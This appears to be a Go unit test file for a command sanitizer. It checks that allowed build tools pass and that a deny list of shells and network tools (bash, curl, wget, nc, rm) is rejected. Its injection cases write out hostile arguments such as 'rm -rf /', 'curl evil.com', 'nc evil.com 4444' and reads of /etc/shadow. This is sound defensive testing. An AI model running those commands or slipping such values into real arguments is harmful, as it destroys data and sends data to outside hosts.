package sanitizer

import (
	"strings"
	"testing"
)

func TestValidateCommand_Valid(t *testing.T) {
	tests := []struct {
		bin  string
		args []string
	}{
		{"go", []string{"build", "./..."}},
		{"go", []string{"run", "./..."}},
		{"go", []string{"test", "-v", "./..."}},
		{"npm", []string{"run", "dev"}},
		{"npm", []string{"install"}},
		{"dotnet", []string{"run"}},
		{"dotnet", []string{"test", "--no-build"}},
		{"python3", []string{"-m", "pytest"}},
		{"yarn", []string{"build"}},
		{"cargo", []string{"build", "--release"}},
	}

	for _, tt := range tests {
		t.Run(tt.bin, func(t *testing.T) {
			err := ValidateCommand(tt.bin, tt.args)
			if err != nil {
				if strings.Contains(err.Error(), "não encontrado no PATH") {
					t.Skipf("binário %q não encontrado no PATH — pulando em CI", tt.bin)
				}
				t.Errorf("esperava sucesso para %q %v, got: %v", tt.bin, tt.args, err)
			}
		})
	}
}

func TestValidateCommand_BinarioNaoPermitido(t *testing.T) {
	cases := []string{"bash", "sh", "cmd", "curl", "wget", "rm", "powershell", "nc", "python2"}
	for _, bin := range cases {
		t.Run(bin, func(t *testing.T) {
			err := ValidateCommand(bin, nil)
			if err == nil {
				t.Errorf("esperava erro para binário não permitido %q", bin)
			}
		})
	}
}

func TestValidateCommand_MetacharactersShell(t *testing.T) {
	tests := []struct {
		desc string
		bin  string
		args []string
	}{
		{"double ampersand", "go", []string{"run", "./... && rm -rf /"}},
		{"semicolon injection", "npm", []string{"run", "dev; curl evil.com"}},
		{"command substitution", "go", []string{"build", "$(rm -rf /)"}},
		{"variable expansion", "go", []string{"build", "${PATH}"}},
		{"pipe injection", "npm", []string{"run", "dev | nc evil.com 4444"}},
		{"output redirect", "go", []string{"build", "> /etc/passwd"}},
		{"input redirect", "go", []string{"build", "< /etc/shadow"}},
		{"double pipe", "go", []string{"run", "./... || curl evil.com"}},
		{"backtick substitution", "go", []string{"build", "`id`"}},
	}

	for _, tt := range tests {
		t.Run(tt.desc, func(t *testing.T) {
			err := ValidateCommand(tt.bin, tt.args)
			if err == nil {
				t.Errorf("esperava erro para %s, mas não obteve", tt.desc)
			}
		})
	}
}
